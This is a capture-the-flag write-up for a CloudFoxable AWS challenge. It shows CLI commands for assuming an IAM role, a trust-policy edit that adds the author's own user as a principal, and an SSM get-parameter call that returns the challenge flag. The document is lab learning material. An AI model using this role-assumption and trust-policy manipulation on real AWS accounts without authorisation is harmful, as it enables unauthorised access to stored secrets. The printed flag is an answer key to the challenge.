
## Challenge Statement

It's another secret 

The goal of this challenge was to retrieve a hidden flag stored in AWS Systems Manager (SSM) by navigating IAM roles, permissions, and trust policies using the AWS CLI.

Steps Taken:
1. First Attempt – Role Assumption Failed
Used the following command to assume the Ertz role:

aws --profile cloudfoxable sts assume-role --role-arn arn:aws:iam::307946660251:role/Ertz --role-session-name Ertz

- Result: Access denied.
- Cause: The trust policy did not authorize non-root-user to assume the role.

2. Fixing the Trust Policy
To resolve the issue, I updated the AssumeRolePolicyDocument of the Ertz role to include my user (non-root-user) as a trusted principal:

{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "AWS": [
        "arn:aws:iam::307946660251:user/ctf-starting-user",
        "arn:aws:iam::307946660251:user/non-root-user"
      ]
    },
    "Action": "sts:AssumeRole"
  }]
}

3. Successful Role Assumption
After modifying the trust policy, I retried the assume-role command. This time, it succeeded and returned temporary security credentials for the Ertz session.

5. Secret Retrieval from AWS SSM
Using the new permissions granted via the Ertz role, I fetched the secret using the following AWS CLI command:

aws ssm get-parameter --name "/cloudfoxable/flag/its-another-secret" --with-decryption --region us-west-2

Output:
FLAG{ItsAnotherSecret::ThereWillBeALotOfAssumingRolesInThisCTF}

7. Permission Verification
I confirmed that the Ertz role had an attached policy allowing SSM access, which explained why I could retrieve the secret after assuming the role. 

## Biggest Challenge:

Formatting and updating the trust policy JSON correctly was tricky.

## Reflection
Security Learnings:
Principle of Least Privilege: Avoid granting Admin access unless necessary.
Secure Secret Management: Always use services like AWS SSM or Secrets Manager to store sensitive data never in plaintext or code
